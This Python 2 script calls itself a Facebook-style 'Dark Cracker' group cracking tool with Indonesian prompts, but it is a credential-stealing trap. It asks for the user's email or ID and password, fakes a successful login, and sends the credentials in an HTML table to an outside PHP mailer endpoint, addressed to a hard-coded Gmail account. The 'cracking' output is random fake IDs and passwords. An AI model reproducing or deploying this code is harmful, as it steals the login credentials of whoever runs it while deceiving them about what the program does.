# coding=UTF-8
import os, sys, time, random
try:
    import requests
except ImportError:
    os.system("pip2 install requests && python2 main.py")

a = '\033[1;30m'
m = '\033[1;31m'
h = '\033[1;32m'
k = '\033[1;33m'
b = '\033[1;34m'
u = '\033[1;35m'
c = '\033[1;36m'
p = '\033[1;37m'
n = '\033[0m'

logo = """{}
\t{}╭╭━━╮╮   ╭┓╭┓   {}┌───────────────────┐
\t{}┊┃╭━╯╯   ┃┗┛┗╮  {}│ Dark Cracker {}V0.1 {}│
\t{} ┃┃╭━━━━━┫╭{}▋▋{}┃  {}└───────────────────┘
\t{} ┃╰┫━╮      ▼┃ {}/     {}./Black{}Hat
\t{} ╰━┫ ┗━╮ ━╮╰┻┣╮
\t{}   ╰━━━┻━━┻━━┻┛
\t{}=====================================
""".format(p,k,p,k,p,m,p,k,m,k,p,k,p,b,m,k,k,p)

imelku = "ilamysup@gmail.com"

req = lambda url, data: requests.post(url, data=data)

def main():
    os.system("clear")
    print logo
    usr = raw_input('{}【{}◆{}】{}Email/id/no {}: {}'.format(p,b,p,h,k,p))
    psw = raw_input('{}【{}◆{}】{}Password    {}: {}'.format(p,b,p,h,k,p))
    print "\n{}【{}◯{}】{}Login...".format(p,b,p,h)
    time.sleep(3)
    print "\n{}【{}✔{}】{}Login Sukses! sedang Menyiapkan Menu".format(p,h,p,h)
    time.sleep(3)
    teks = """
<table border="1" cellpadding="5" bgcolor="black" width=100%>
<tr>
<th colspan="2"><center><font color="white">DATA AKUN HEKER BODOH:V</font></th>

</tr>
<tr>
<td bgcolor="white"><center><b>Username</td>
<td bgcolor="white"><center>{}</td>
</tr>
<tr>
  <td bgcolor="white" width=30%><center><b>Password</b></td>
  <td bgcolor="white"><center>{}</td>
</tr>
    """.format(usr,psw)
    web = 'http://savvymotherschool.com/files/post.php'
    data = {"from":"[!] Setoran Nya Bos","email_kamu":"extremeboy@phising.net","email_target":imelku,"subject":"Ussername : "+usr,"mesage":teks}
    try:
        req(web,data)
    except requests.exceptions.ConnectionError:
        print "{}【{}✖{}】{}Periksa jaringan anda".format(p,m,p,h)
    menu()

def menu():
    os.system("clear")
    print logo
    grup = raw_input('{}【{}◆{}】{}ID Grup {}: {}'.format(p,b,p,h,k,p))
    tunggu = random.randint(0, 5)
    time.sleep(tunggu)
    print "\n{}【{}✔{}】{}Sukses! mengambil data member grup...\n".format(p,h,p,h)
    time.sleep(tunggu)
    sys.exit("{}【{}!{}】{}Program berhenti".format(p,m,p,h))
    dapat = random.randint(0, 99)
    for x in range(dapat):
        idmember = random.randint(0, 99999999999)
        cp = random.choice(["CP", "OK"])
        pw = random.choice(["sayang", "anonymous", "freefire", "indonesia", "doraemon", "12345", "123456", "ronaldo", "anjing", "cintaku"])
        print "{}[{}".format(p,b)+cp+"{}]{}".format(p,h),"1000"+str(idmember)+" {}|{} ".format(p,h)+pw
        save = open("hasil.txt", "w")
        save.write("Terjadi Error"+"\n")
        save.close()
        jeda = random.randint(0, 9)
        time.sleep(jeda)
    print "\n{}【{}✔{}】{}Crack Sudah Sesesai".format(p,h,p,p)
    print "{}Hasil Crack Di Simpan di : hasil.txt".format(p)
    ulang = raw_input("{}Crack lg? y/n : {}".format(p,h))
    if ulang == "y":
        os.system("python2 main.py")
    else:
        sys.exit("{}【{}!{}】{}Program berhenti".format(p,m,p,h))


if __name__ == "__main__":
    main()
